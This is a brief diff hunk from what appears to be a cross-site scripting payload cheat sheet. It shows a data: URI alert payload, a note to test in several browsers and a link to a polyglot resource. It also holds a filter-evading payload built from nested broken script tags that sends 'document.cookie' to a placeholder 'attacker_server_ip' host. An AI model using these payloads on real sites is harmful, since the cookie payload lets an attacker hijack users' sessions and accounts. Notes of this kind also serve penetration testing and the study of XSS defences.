@@ -5,7 +5,7 @@ data:text/html,<script>alert('XSS by Vickie')</script>
 ALWAYS TEST BY USING MULTIPLE BROWSERS
 
 
-https://polyglot.innerht.ml/
+https://polyglot.innerht.ml/ >>>> redirects to wayback
 <scrip<script>t>
 location='http://attacker_server_ip/c='+document.cookie;
 </scrip</script>t>
